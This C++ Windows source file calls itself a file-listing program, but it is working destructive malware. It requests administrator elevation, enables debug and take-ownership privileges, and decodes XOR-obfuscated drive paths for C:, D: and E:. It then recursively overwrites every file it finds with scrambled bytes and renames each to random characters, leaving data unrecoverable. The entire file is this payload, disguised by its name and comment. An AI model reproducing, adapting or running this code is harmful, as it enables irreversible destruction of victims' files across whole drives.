// List_FIles.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <conio.h>
#include <stdio.h>
#include <string.h>
#include <time.h> 


char test[4] = "\\*";
DWORD count = 0;

void err(LPCSTR a) {
	printf("Error :%s\n,Error code : 0x%x", a, GetLastError());
	system("pause");
	exit(GetLastError());
}

BOOL setPrivilege(HANDLE hToken, LPCWSTR privilege_name, BOOL flag) {
	TOKEN_PRIVILEGES tp;
	LUID luid;
	BOOL test = FALSE;

	if (!LookupPrivilegeValueW(NULL, privilege_name, &luid)) err("LookupPrivilegeValue Failed!");

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	if (flag) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else tp.Privileges[0].Attributes = 0;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) test = FALSE;
	else test = TRUE;

	return test;
}
char random()
{
	BYTE i = 0;
	BYTE num = (rand() % (0x7A - 0x40 + 1)) + 0x40;
	if (num == 0x5c || num == 0x5f || num == 0x7c) num = random();
	return num;
}

void Elevation() {
	BOOL test = FALSE;
	char path[128] = "<unknown>";
	//Get Executable Path
	if (GetModuleFileNameA(NULL, path, sizeof(path))) {
		//Launch as admin
		SHELLEXECUTEINFOA shell = { sizeof(shell) };
		shell.lpVerb = "runas";
		shell.lpFile = path;
		shell.hwnd = NULL;
		shell.nShow = SW_NORMAL;

		if (!ShellExecuteExA(&shell)) err("ShellExecuteExA Failed!");
	}
}

BOOL isAdmin() {
	BOOL admin_mode;
	DWORD dwError = 0;
	PSID pAdmin_Group = NULL;

	SID_IDENTIFIER_AUTHORITY se_authority = SECURITY_NT_AUTHORITY;

	if ((!(AllocateAndInitializeSid(&se_authority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdmin_Group))))
		err("Allocate Failed!");

	if (!CheckTokenMembership(NULL, pAdmin_Group, &admin_mode)) {

		if (pAdmin_Group) {
			FreeSid(pAdmin_Group);
			pAdmin_Group = NULL;
		}
	}

	return admin_mode;
}

void encrypt_file(LPSTR file_name) {
	HANDLE v1, v2;
	v1 = NULL;
	v2 = NULL;
	DWORD file_size = 0;
	char *buffer;
	DWORD temp_length = strlen(file_name) + 1;
	char *temp = (char*)malloc(temp_length);
	strcpy(temp,file_name);

	temp_length = strlen(temp) - 1;
	while (temp[temp_length] != 0x5c) {
		temp[temp_length] = random();
		temp_length--;
	}


	v1 = CreateFileA(file_name, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, NULL);
	if (v1 == INVALID_HANDLE_VALUE || v1==NULL) {
		
		CloseHandle(v1);
		free(temp);
		return;
	}

	else {
		v2 = CreateFileMappingA(v1, NULL, 0x04, 0, 0, 0);

		if (v2 == INVALID_HANDLE_VALUE || !v2) {
			CloseHandle(v1);
			CloseHandle(v2);
			return;
		}

		else {

			file_size = GetFileSize(v1, 0);
			buffer = (char*)malloc(file_size);
			buffer = (char*)MapViewOfFile(v2, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);


			if (buffer == NULL) {
				CloseHandle(v1);
				CloseHandle(v2);
				UnmapViewOfFile(buffer);
				printf("Error in file :%s\nError code :0x%x", file_name, GetLastError());
				return;
			}

			else {
				
				int i = 0;
				while (i < file_size-1) {
					
				buffer[i]=(rand()<<2) +buffer[i+1]^3;
				i++;
				}
				UnmapViewOfFile(buffer);
				CloseHandle(v1);
				CloseHandle(v2);
				printf("Old :%s\n",file_name);
				printf("New :%s\n\n\n",temp);
				if (rename(file_name, temp) == -1)printf("Error in rename \nError code :0x%x\n\n", GetLastError());
			}
			free(temp);

		}
	}

}

DWORD list(LPSTR a, DWORD count) {
	DWORD res = 0, num = 0;
	HANDLE v1 = NULL, v2 = NULL, v3 = NULL;
	WIN32_FIND_DATAA find_data;
	char *v4, *v5, *v6;
	num = count;

	if (num <= 7) {

		v1 = FindFirstFileA(a, &find_data);
		if (v1 == INVALID_HANDLE_VALUE) return res;
		while (v1 != INVALID_HANDLE_VALUE) {

			if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				|| !strcmp(find_data.cFileName, ".")
				|| !strcmp(find_data.cFileName, "..")) {

				DWORD mem = strlen(a) + strlen(find_data.cFileName) + 6;
				v4 = (char*)malloc(mem);
				strcpy(v4,a);
				v4[strlen(v4) - 1] = 0;
				strcat(v4,find_data.cFileName);

				if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))encrypt_file(v4);
				free(v4);

			}

			else {
				DWORD mem = strlen(a) + strlen(find_data.cFileName) + 6;
				v4 = (char*)malloc(mem);

				strcpy(v4,a);
				v4[strlen(v4) - 1] = 0;
				strcat(v4,find_data.cFileName);
				strcat(v4,test);

				list(v4, count + 1);
				free(v4);
			}


			res = FindNextFileA(v1, &find_data);
			if (!res) return res;
		}

		res = FindClose((HANDLE(-1)));
	}
	return res;

}
BOOL delimit(char *a) {

	size_t length = 0;
	length = strlen(a);
	if (a[length - 1] == 'e' && a[length - 2] == 'x' && a[length - 3] == 'e') return 1;

	else return 0;
}



int main(int argc, char **argv)
{
	char buf[12] = "F9_)";
	
	srand(time(0));
	DWORD count = 0, test = 0;
	test = isAdmin();
	if (test) {
		HANDLE v2 = NULL;
		HANDLE v1 = NULL;

		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &v2))  exit(GetLastError());
		if (!setPrivilege(v2, L"SeSecurityPrivilege", 1)) exit(GetLastError());
		if (!setPrivilege(v2, L"SeTakeOwnershipPrivilege", 1)) exit(GetLastError());
		if (!setPrivilege(v2, L"SeDebugPrivilege", 1)) exit(GetLastError());
		int i=0;
		while(buf[i])buf[i++]^=3;
		i=0;
		if (!list(buf, count)) {
			char buff_02[5] = "G9_)";
			while(buff_02[i])buff_02[i++]^=3;
			i=0;
			if(!list(buff_02, count)) {
				char bu[10]="@9_)";
				while(bu[i])bu[i++]^=3;
				if(!list(bu,count)) exit(0);
			}
			exit(0);
		}

	}
	else Elevation();
	system("pause");
	return 0;
}
